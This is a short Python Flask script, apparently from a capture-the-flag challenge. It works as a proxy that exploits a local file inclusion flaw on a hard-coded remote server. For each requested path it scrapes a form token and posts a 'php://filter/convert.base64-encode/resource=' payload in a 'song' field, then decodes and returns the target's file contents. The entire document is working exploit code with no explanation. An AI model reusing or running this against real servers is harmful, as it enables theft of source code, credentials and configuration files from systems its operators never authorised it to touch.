from flask import Flask, Response
import requests
import base64
app = Flask(__name__)

s = requests.Session()
token = ''

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    global token
    url = 'http://61.28.237.24:30102/'
    if token == '':
        token = s.get(url).content.split(b'<input name="token" value="')[1].split(b'" hidden>')[0]
        print('[+] Token:', token)
    data = {
        'song': 'php://filter/convert.base64-encode/resource=' + path,
        'token': token
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    content = s.post(url, headers=headers, data=data).content
    token = content.split(b'<input name="token" value="')[1].split(b'" hidden>')[0]
    response = content.split(b'<pre>')[1].split(b'</pre>')[0]
    try:
        response = base64.b64decode(response)
    except:
        response = ''
    return Response(response, mimetype='text/xml')

if __name__ == '__main__':
    app.run()
